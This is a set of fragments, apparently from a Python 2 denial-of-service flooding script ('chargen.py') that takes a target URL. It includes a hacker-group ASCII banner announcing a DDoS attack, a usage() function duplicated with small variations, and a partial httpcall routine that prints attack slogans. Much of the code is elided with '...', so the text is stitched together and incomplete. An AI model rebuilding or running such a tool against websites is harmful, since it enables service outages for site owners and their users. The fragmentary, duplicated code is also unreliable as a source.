...
def usage():
	print '---------------------------------------------------'
	print 'To use windows : chargen.py <url>'
	print 'To use Linux   : python chargen.py <url> '
	print "\a"
def usage():
	print '---------------------------------------------------'
	print 'To use windows : chargen.py <url>'
	print 'To use Linux   : python chargen.py <url> '
	print 'Jika kata tak lagi bermakna lebih baik diam saja ;) '
	print "\a"
...
| $$    $$| $$  | $$| $$  | $$| $$  \ $$| $$  \ $$| $$      | $$\  $$$
|  $$$$$$/| $$  | $$| $$  | $$| $$  | $$|  $$$$$$/| $$$$$$$$| $$ \  $$
 \______/ |__/  |__/|__/  |__/|__/  |__/ \______/ |________/|__/  \__/
                                                            DDOS ATTACKING MISTER_D 
___________________________________________________________ [KALI-LINUX]
...
def httpcall(url):
	...
	try:
			...
			#print e.code
			set_flag(1)
 			print '=> DRAGON CYBER ARMY ATTACKING WITH NICROBER CYEBR TEAM <= '
 			print '=> MISTER_D <= '
			code=500
